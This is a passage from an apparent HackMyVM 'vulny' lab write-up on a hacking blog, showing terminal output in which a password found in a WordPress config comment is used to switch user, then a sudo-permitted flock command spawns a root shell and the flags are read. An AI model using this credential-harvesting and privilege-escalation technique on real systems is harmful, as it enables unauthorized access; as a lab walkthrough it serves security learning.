/usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="string"> ***/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="string"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string">$debian_server = preg_replace(&#x27;</span>/:.*/<span class="string">&#x27;, &quot;&quot;, $_SERVER[&#x27;</span>HTTP_HOST<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">$debian_server = preg_replace(&quot;/[^a-zA-Z0-9.\-]/&quot;, &quot;&quot;, $debian_server);</span></span><br><span class="line"><span class="string">$debian_file = &#x27;</span>/etc/wordpress/config-<span class="string">&#x27;.strtolower($debian_server).&#x27;</span>.php<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="string">$debian_main_server = preg_replace(&quot;/^[^.]*\./&quot;, &quot;&quot;, $debian_server);</span></span><br><span class="line"><span class="string">$debian_main_file = &#x27;</span>/etc/wordpress/config-<span class="string">&#x27;.strtolower($debian_main_server).&#x27;</span>.php<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (file_exists($debian_file)) &#123;</span></span><br><span class="line"><span class="string">    require_once($debian_file);</span></span><br><span class="line"><span class="string">    define(&#x27;</span>DEBIAN_FILE<span class="string">&#x27;, $debian_file);</span></span><br><span class="line"><span class="string">&#125; elseif (file_exists($debian_main_file)) &#123;</span></span><br><span class="line"><span class="string">    require_once($debian_main_file);</span></span><br><span class="line"><span class="string">    define(&#x27;</span>DEBIAN_FILE<span class="string">&#x27;, $debian_main_file);</span></span><br><span class="line"><span class="string">&#125; elseif (file_exists(&quot;/etc/wordpress/config-default.php&quot;)) &#123;</span></span><br><span class="line"><span class="string">    require_once(&quot;/etc/wordpress/config-default.php&quot;);</span></span><br><span class="line"><span class="string">    define(&#x27;</span>DEBIAN_FILE<span class="string">&#x27;, &quot;/etc/wordpress/config-default.php&quot;);</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    header(&quot;HTTP/1.0 404 Not Found&quot;);</span></span><br><span class="line"><span class="string">    echo &quot;Neither &lt;b&gt;$debian_file&lt;/b&gt; nor &lt;b&gt;$debian_main_file&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;;</span></span><br><span class="line"><span class="string">    exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* idrinksomewater */   ####密码</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (isset($_SERVER[&#x27;</span>HTTP_X_FORWARDED_PROTO<span class="string">&#x27;]) &amp;&amp; $_SERVER[&#x27;</span>HTTP_X_FORWARDED_PROTO<span class="string">&#x27;] == &#x27;</span>https<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    $_SERVER[&#x27;</span>HTTPS<span class="string">&#x27;] = &#x27;</span>on<span class="string">&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">require_once(ABSPATH . &#x27;</span>wp<span class="literal">-settings</span>.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">www-data@vulny:/usr/share/wordpress$ su adrain</span></span><br><span class="line"><span class="string">su adrain</span></span><br><span class="line"><span class="string">su: user adrain does not exist</span></span><br><span class="line"><span class="string">www-data@vulny:/usr/share/wordpress$ su adrian</span></span><br><span class="line"><span class="string">su adrian</span></span><br><span class="line"><span class="string">Password: idrinksomewater</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">adrian@vulny:/usr/share<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span>: user.txt: No such file or directory</span><br><span class="line">adrian@vulny:/usr/share<span class="variable">$</span> <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">bash: <span class="built_in">cd</span>: home: No such file or directory</span><br><span class="line">adrian@vulny:/usr/share<span class="variable">$</span> <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">adrian@vulny:/usr<span class="variable">$</span> <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">adrian@vulny:/<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swap.img  usr</span><br><span class="line">adrian@vulny:/<span class="variable">$</span> <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">adrian@vulny:/home<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">adrian</span><br><span class="line">adrian@vulny:/home<span class="variable">$</span> <span class="built_in">cd</span> adrian</span><br><span class="line"><span class="built_in">cd</span> adrian</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">HMViuploadfiles</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> adrian on vulny:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User adrian may run the following commands on vulny:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/flock</span><br><span class="line">adrian@vulny:~<span class="variable">$</span> sudo flock <span class="literal">-u</span> root /bin/bash</span><br><span class="line">sudo flock <span class="literal">-u</span> root /bin/bash</span><br><span class="line">root@vulny:/home/adrian<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root  user.txt</span><br><span class="line">root@vulny:/home/adrian<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">bash: <span class="built_in">cd</span>: root: Not a directory</span><br><span class="line">root@vulny:/home/adrian<span class="comment"># cd ..</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">root@vulny:/home<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">adrian</span><br><span class="line">root@vulny:/home<span class="comment"># cd ..</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">root@vulny:/<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin    dev   lib    libx32      mnt   root  snap      sys  var</span><br><span class="line">boot   etc   lib32  lost+found  opt   run   srv       tmp</span><br><span class="line">cdrom  home  lib64  media       proc  sbin  swap.img  usr</span><br><span class="line">root@vulny:/<span class="comment"># cd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">root@vulny:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">root.txt  snap</span><br><span class="line">root@vulny:~<span class="comment"># cat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">HMVididit</span><br><span class="line">root@vulny:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+            
+        </div>
+        <footer class="article-footer">
+            <a data-url="http://example.com/2023/07/26/vulny/" data-id="clmnr8k0r002lso8gfdc9dop2" data-title="vulny"
+               class="article-share-link">Share</a>
+            
+            
+            
+            
+    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li></ul>
+
+
+        </footer>
+    </div>
+    
+        
+    <nav id="article-nav" class="wow fadeInUp">
+        
+            <div class="article-nav-link-wrap article-nav-link-left">
+                
+                    <img data-src="http://lc-PwMydsXe.cn-n1.lcfile.com/OLL2yAqlmnV1Cn74q8lqKDF77vrYDGU0/a584e83331864cd68928ebea3f81e50c.jpg" data-sizes="auto" alt="crack"
+                         class="lazyload">
+                
+                <a href="/2023/07/27/crack/"></a>
+                <div class="article-nav-caption">Newer</div>
+                <h3 class="article-nav-title">
+                    
+                        crack
+                    
+                </h3>
+            </div>
+        
+        
+            <div class="article-nav-link-wrap article-nav-link-right">
+                
+                    <img data-src="http://lc-PwMydsXe.cn-n1.lcfile.com/TxQH8Tc2juJcB7ris990vgkYndgnGhQM/a43ac0917d18481b8e7d7e607307a0e7.jpg" data-sizes="auto" alt="friendly"
+                         class="lazyload">
+                
+                <a href="/2023/07/25/friendly/"></a>
+                <div class="article-nav-caption">Older</div>
+                <h3 class="article-nav-title">
+                    
+                        friendly
+                    
+                </h3>
+            </div>
+        
+    </nav>
+
+
+    
+</article>
+
+
+
+
+
+
+
+
+
+
+
+</section>
+                
+                    <aside id="sidebar">
+    <div class="sidebar-wrap wow fadeInRight">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="honkerZ" class="lazyload">
+            <div class="sidebar-author-name">honkerZ</div>
+            <div class="sidebar-description">hacking</div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">18</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">3</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">23</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/kter123 itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+        </div>
+    </div>
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Categories</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
+        </div>
+    </div>
+
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Tag Cloud</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
+        </div>
+    </div>
+
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
+        </div>
+    </div>
+
+
+    
+</aside>
+
+                
+            </div>
+            <footer id="footer" class="wow fadeInUp">
+    <div style="width: 100%; overflow: hidden"><div class="footer-line"></div></div>
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            
+            <div>
+                <span class="icon-copyright"></span>
+                2020-2023
+                <span class="footer-info-sep"></span>
+                honkerZ
+            </div>
+            
+                <div>
+                    Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+                    Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+                </div>
+            
+            
+                <div>
+                    <span class="icon-brush"></span>
+                    27k
+                    &nbsp;|&nbsp;
+                    <span class="icon-coffee"></span>
+                    02:29
+                </div>
+            
+            
+                <div>
+                    <span class="icon-eye"></span>
+                    <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                    &nbsp;|&nbsp;
+                    <span class="icon-user"></span>
+                    <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+                </div>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+        <nav id="mobile-nav">
+    <div class="sidebar-wrap">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="honkerZ" class="lazyload">
+            <div class="sidebar-author-name">honkerZ</div>
+            <div class="sidebar-description">hacking</div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">18</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">3</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">23</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/kter123 itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+        </div>
+    </div>
+</nav>
+
+        
+<script src="https://unpkg.com/jquery@3.7.0/dist/jquery.min.js"></script>
+
+
+<script src="https://unpkg.com/lazysizes@5.3.2/lazysizes.min.js"></script>
+
+
+<script src="https://unpkg.com/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+
+    
+<script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script>
+
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </div>
+    <div class="site-search">
+        <div class="algolia-popup popup">
+            <div class="algolia-search">
+                <span class="algolia-search-input-icon"></span>
+                <div class="algolia-search-input" id="algolia-search-input"></div>
+            </div>
+
+            <div class="algolia-results">
+                <div id="algolia-stats"></div>
+                <div id="algolia-hits"></div>
+                <div id="algolia-pagination" class="algolia-pagination"></div>
+            </div>
+
+            <span class="popup-btn-close"></span>
+        </div>
+    </div>
+    <!-- hexo injector body_end start -->
+<script src="/js/insertHighlight.js"></script>
+<!-- hexo injector body_end end --></body>
+    </html>
+
